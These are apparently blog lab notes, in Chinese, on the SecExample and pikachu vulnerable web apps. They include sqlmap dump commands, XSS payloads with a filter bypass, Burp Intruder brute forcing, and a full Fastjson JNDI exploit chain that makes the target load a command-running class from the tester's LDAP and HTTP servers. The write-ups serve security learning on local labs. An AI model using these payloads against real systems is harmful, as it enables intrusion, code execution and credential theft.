</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/28/SecExample/">SecExample-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-06-04</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300944877.png" alt="image-20240530094448840"></p>
<p>UserMapper.java代码中使用了 <code>@Mapper</code> 和 <code>@Repository</code> 注解，这通常用于 MyBatis 的 Mapper 接口。</p>
<p>使用了 MyBatis 框架，它通过 XML 配置文件或注解来定义 SQL 查询。这些查询语句可能存在于 MyBatis 的 XML 配置文件中，或者是通过注解方式定义的</p>
<p>检查 MyBatis 的 XML 配置文件或注解，找到 <code>UserMapper</code> 接口中 <code>listUser</code> 和 <code>listUserByName</code> 方法的具体实现</p>
<p>在UserMapper.xml中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300934056.png" alt="image-20240530093431953"></p>
<p>在 <code>listUserByName</code> 查询中，使用了 <code>$&#123;name&#125;</code> 来拼接 SQL 语句。<code>$&#123;&#125;</code> 是 MyBatis 的一种字符串替换方式，直接将用户输入的值插入到 SQL 查询中，这种方式容易导致 SQL 注入漏洞，如果用户输入了恶意的 SQL 代码，可能会破坏数据库或窃取数据</p>
<p>为了防止 SQL 注入漏洞，应使用 MyBatis 提供的 <code>#&#123;&#125;</code> 参数化查询方式。这种方式会使用预编译语句，确保用户输入不会直接作为 SQL 代码执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405300954169.png" alt="image-20240530095433112"></p>
<p>使用sqlmap</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; --dbs</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis --tables</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user --columns</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/sql/?name=1&quot; -D mybatis -T user -C name,id,pwd --dump</span><br></pre></td></tr></table></div></figure>

<p>好像注入出来的信息和本身的界面一样…</p>

        <h1 id="RCE"   >
          <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281403684.png" alt="image-20240528140353654"></p>
<p>映射 <code>/rce</code> 的 GET 请求到 <code>input</code> 方法</p>
<p><code>public String input()</code> 方法返回视图名称 <code>&quot;rce/rce&quot;</code>，渲染 <code>rce/rce</code> 页面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281404456.png" alt="image-20240528140417408"></p>
<p>从请求参数中获取名为 <code>command</code> 的值</p>
<p>检查 <code>command</code> 是否为 <code>null</code> 或空字符串，如果是，则默认设置为 <code>&quot;whoami&quot;</code></p>
<p>声明 <code>Process</code> 对象 <code>p</code>，用于存储运行的进程；声明 <code>String</code> 变量 <code>result</code>，用于存储命令执行的结果</p>
<p>使用 <code>Runtime.getRuntime().exec(command)</code> 执行命令（<code>Runtime.getRuntime().exec()</code> 是 Java 中用于在运行时执行系统命令的一个函数，<code>Runtime</code> 类允许应用程序与运行时环境进行交互）</p>
<p>如果执行命令时发生 <code>IOException</code>，捕获异常并打印堆栈跟踪</p>
<p>获取命令执行的标准输出流 <code>InputStream</code>，使用 <code>BufferedReader</code> 逐行读取标准输出，在 <code>while (true)</code> 循环中读取每一行的输出，并将其存储在 <code>result</code> 中，当读取到 <code>null</code> 时，表示输出结束，退出循环，如果在读取过程中发生 <code>IOException</code>，捕获异常并打印堆栈跟踪</p>

        <h1 id="spel表达式注入"   >
          <a href="#spel表达式注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#spel表达式注入" class="headerlink" title="spel表达式注入"></a>spel表达式注入</h1>
      <p>SpEL表达式注入是一种攻击方式，攻击者通过恶意输入在应用程序中执行任意的 SpEL 表达式，从而实现未授权的操作</p>
<p>SpEL 是 Spring Framework 提供的一种表达式语言，通常用于在 Spring 配置文件、注解和其他地方进行表达式计算</p>

        <h1 id="XSS"   >
          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281517734.png" alt="image-20240528151727685"></p>
<p>从请求参数中获取名为 <code>name</code> 的值，并将其赋给 <code>name</code> 变量</p>
<p>将 <code>Person</code> 对象添加到模型中，以便在视图中显示</p>
<p>返回视图名称 <code>xss/xssoutput</code>，用于渲染输出页面</p>
<p>由于用户输入的 <code>name</code> 值直接显示在输出页面 <code>xssoutput</code> 上，将用户输入的内容嵌入到 HTML 中，所以如果用户输入包含恶意脚本代码，会导致 XSS 攻击</p>

        <h1 id="CSRF"   >
          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281619851.png" alt="image-20240528161919791"></p>
<p>从请求中获取 <code>User</code> 对象 <code>user1</code> 并设置到类成员变量 <code>user</code> 中，使用 <code>userService.addUser(user)</code> 将用户添加到服务中</p>

        <h1 id="SSRF"   >
          <a href="#SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290942265.png" alt="image-20240529094223191"></p>
<p>处理 POST 请求，接受一个 URL 参数，并通过 <code>HttpTool.getHttpReuest</code> 获取该 URL 的内容，然后将结果添加到模型中，返回视图 <code>ssrf/ssrfoutput</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405290948049.png" alt="image-20240529094806007"></p>
<p><code>httpRequest(String requestUrl)</code>：接受一个 URL 参数，打开该 URL 的连接，读取内容并返回</p>
<p><code>getHttpReuest(String requestUrl)</code>：调用 <code>httpRequest</code> 方法，简化调用流程</p>
<p>由于应用程序从用户输入获取 URL 并直接在服务器上发起请求，而没有进行任何验证或过滤，所以用户可以通过服务器代理访问任意资源</p>

        <h1 id="CORS"   >
          <a href="#CORS" class="heading-link"><i class="fas fa-link"></i></a><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291020680.png" alt="image-20240529102023649"></p>
<p>使用 <code>@CrossOrigin</code> 注解配置跨域访问，允许来自任何域的请求，这是 Spring 的一种声明式配置方式</p>
<p>将敏感信息添加到模型中，并返回视图名 <code>cors/cors</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291029949.png" alt="image-20240529102922909"></p>
<p>在响应头中设置 <code>Access-Control-Allow-Origin</code>，允许来自任何域的跨域请求，它允许任意网站读取该资源，将敏感信息添加到模型中，直接设置响应头，这是一个编程式配置方式，需要在每个方法中显式设置响应头</p>
<p>在模型中添加了敏感信息 <code>info</code>，如果没有适当的访问控制措施，可能导致敏感信息泄露。</p>
<p>并且这两个都设置了都会返回 <code>Access-Control-Allow-Origin: *</code>，意味着允许任何来源的跨域请求</p>

        <h1 id="Fastjson反序列化"   >
          <a href="#Fastjson反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h1>
      
        <h3 id="代码分析"   >
          <a href="#代码分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291633945.png" alt="image-20240529163300842"></p>
<p><code>JSON.parseObject(jsonData)</code>：使用 FastJSON 库解析 JSON 数据</p>
<p>设置 <code>User</code> 对象的属性 <code>age</code> 和 <code>username</code></p>
<p>将 <code>User</code> 对象添加到模型中，供视图使用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291634212.png" alt="image-20240529163444175"></p>
<p>将 <code>User</code> 对象添加到模型中</p>

        <h3 id="漏洞复现"   >
          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
      <p>首先修改dockerfile文件第一行为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM openjdk:8u111-jdk-alpine</span><br></pre></td></tr></table></div></figure>

<p>改之前这个docker的java版本是8u212</p>

        <h6 id="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"   >
          <a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="heading-link"><i class="fas fa-link"></i></a><a href="#JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK-8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效" class="headerlink" title="JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效"></a>JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效</h6>
      <p>改了之后才能进行攻击</p>

        <h5 id="编译并上传命令执行代码"   >
          <a href="#编译并上传命令执行代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译并上传命令执行代码" class="headerlink" title="编译并上传命令执行代码"></a>编译并上传命令执行代码</h5>
      <p>新建一个Touch.java文件，写入</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Touch</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/Touch&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后在该文件目录下打开终端，编译，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Touch.java</span><br></pre></td></tr></table></div></figure>

<p>此时该目录下会生成一个Touch.class文件</p>

        <h5 id="启动http服务"   >
          <a href="#启动http服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h5>
      <p>打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444   //端口号只要不被其他应用占用就行</span><br></pre></td></tr></table></div></figure>


        <h5 id="启动LDAP服务器"   >
          <a href="#启动LDAP服务器" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动LDAP服务器" class="headerlink" title="启动LDAP服务器"></a>启动LDAP服务器</h5>
      <p>在E:\Github\marshalsec-master\target目录下打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://主机ip地址:4444/#Touch&quot;</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311544536.png" alt="image-20240531154409456"></p>

        <h5 id="发包"   >
          <a href="#发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#发包" class="headerlink" title="发包"></a>发包</h5>
      <p>抓包后修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Host: 本机ip:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;100&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://本机ip:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 189</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>发送后会显示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311554700.png" alt="image-20240531155441657"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311555719.png" alt="image-20240531155505690"></p>
<p>查看docker文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311556646.png" alt="image-20240531155609569"></p>

        <h1 id="验证码相关漏洞"   >
          <a href="#验证码相关漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码相关漏洞" class="headerlink" title="验证码相关漏洞"></a>验证码相关漏洞</h1>
      
        <h3 id="代码分析-1"   >
          <a href="#代码分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141031.png" alt="image-20240529214056931"></p>
<p>成员变量 <code>Code</code> 用于存储生成的验证码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292141142.png" alt="image-20240529214151097"></p>
<p>创建一个 <code>Random</code> 对象生成一个随机数 <code>number</code>，范围在 <code>0</code> 到 <code>899999</code> 之间</p>
<p>将生成的验证码 <code>number</code> 添加到模型中，键为 <code>code</code></p>
<p>将生成的验证码打印到控制台</p>
<p>将成员变量 <code>Code</code> 设置为生成的验证码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292142029.png" alt="image-20240529214237991"></p>
<p>初始化结果字符串 <code>result</code> 为 <code>&quot;fail&quot;</code></p>
<p>检查 <code>code1</code> 是否不为空且不为 <code>0</code>，并且是否与生成的验证码 <code>Code</code> 相等，如果验证通过，打印 <code>true</code> 到控制台，并将 <code>result</code> 设置为 <code>&quot;sueecss&quot;</code>（拼写错了）</p>
<p>将结果字符串 <code>result</code> 添加到模型中，键为 <code>code1</code></p>

        <h3 id="漏洞复现-1"   >
          <a href="#漏洞复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292144331.png" alt="image-20240529214414283"></p>
<p>获取验证码</p>
<p>在这里可以找到生成的随机数，即验证码（直接查看网页源代码也有）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145052.png" alt="image-20240529214501002"></p>
<p>输入登录后，返回sueecss</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405292145841.png" alt="image-20240529214532798"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/23/pikachu%E9%9D%B6%E5%9C%BA/">pikachu-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-23</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-06-07</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="暴力破解"   >
          <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1>
      
        <h2 id="基于表单的暴力破解"   >
          <a href="#基于表单的暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231310101.png" alt="image-20240523131040028"></p>
<p>随便输入登录，抓包并发送到Intruder，选择集束攻击，并标好payload位置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231310194.png" alt="image-20240523130854587"></p>
<p>在payload里上传字典，开始攻击，发现有数据的返回包的数据长度不一样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231311692.jpg" alt="img"></p>
<p>爆破出账号密码，点击数据包确认一下，爆破成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231312382.png" alt="image-20240523131252343"></p>

        <h2 id="验证码绕过-on-server"   >
          <a href="#验证码绕过-on-server" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231313733.png" alt="image-20240523131332711"></p>
<p>随便输入一串数字登录，抓包并发送到Intruder，验证码改成正确的，按上一题一样设置，开始攻击，根据长度的特别可以找到正确的账号密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231314702.jpg" alt="img"></p>

        <h2 id="验证码绕过-on-client"   >
          <a href="#验证码绕过-on-client" class="heading-link"><i class="fas fa-link"></i></a><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231314905.png" alt="image-20240523131459880"></p>
<p>随便输入一串数字登录，抓包并发送到Intruder，按上一题一样设置，开始攻击，根据长度的特别可以找到正确的账号密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231315971.jpg" alt="img"></p>

        <h2 id="token防爆破"   >
          <a href="#token防爆破" class="heading-link"><i class="fas fa-link"></i></a><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231320565.png" alt="image-20240523132046539"></p>
<p>抓包，获取响应后token值不一样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231327067.png" alt="image-20240523132714015"></p>
<p>按DVWA靶场High级别的步骤进行爆破</p>
<p>最终获得账号和密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231329885.png" alt="image-20240523132954839"></p>

        <h1 id="XSS"   >
          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1>
      
        <h2 id="反射型xss-get"   >
          <a href="#反射型xss-get" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2>
      <p>看到有一个输入框</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231332325.png" alt="image-20240523133241298"></p>
<p>随便输点内容并提交，可以看到URL上出现了输入的内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231333776.png" alt="image-20240523133355743"></p>
<p>尝试了一下这个输入框有输入数量限制，可以直接在URL上给message传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231334161.png" alt="image-20240523133453131"></p>

        <h2 id="反射性xss-post"   >
          <a href="#反射性xss-post" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射性xss-post" class="headerlink" title="反射性xss(post)"></a>反射性xss(post)</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231335614.png" alt="image-20240523133523588"></p>
<p>登录一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231335522.png" alt="image-20240523133551494"></p>
<p>直接在框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231339666.png" alt="image-20240523133956631"></p>

        <h2 id="存储型xss"   >
          <a href="#存储型xss" class="heading-link"><i class="fas fa-link"></i></a><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231340960.png" alt="image-20240523134033933"></p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交后出现弹窗，并且在删除之前每点进这个页面就会出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231341095.png" alt="image-20240523134121056"></p>

        <h2 id="DOM型xss"   >
          <a href="#DOM型xss" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231345475.png" alt="image-20240523134524446"></p>
<p>输入提交试试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231345380.png" alt="image-20240523134552347"></p>
<p>点击蓝色链接结果却是404，有点击这个操作，换一个标签试试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>再点击蓝色链接，出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231347713.png" alt="image-20240523134718678"></p>

        <h2 id="DOM型xss-x"   >
          <a href="#DOM型xss-x" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231348227.png" alt="image-20240523134847194"></p>
<p>按上一题一样尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231349083.png" alt="image-20240523134923058"></p>
<p>点击蓝色链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231349823.png" alt="image-20240523134936799"></p>
<p>再点第一个链接，成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231349939.png" alt="image-20240523134959903"></p>

        <h2 id="xss盲打"   >
          <a href="#xss盲打" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231350831.png" alt="image-20240523135019800"></p>
<p>先尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>但是提交后没反应，看看提示，说让登录去后台看看，登录后即出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231355165.png" alt="image-20240523135553131"></p>
<p>登录进去后也能看到留言板内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231357174.png" alt="image-20240523135729144"></p>

        <h2 id="xss之过滤"   >
          <a href="#xss之过滤" class="heading-link"><i class="fas fa-link"></i></a><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231357401.png" alt="image-20240523135747377"></p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>提交可以看到是被过滤了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231358749.png" alt="image-20240523135816726"></p>

        <h3 id="大小写绕过"   >
          <a href="#大小写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;alert(/xss/)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231401969.png" alt="image-20240523140103929"></p>

        <h3 id="其他标签"   >
          <a href="#其他标签" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h3>
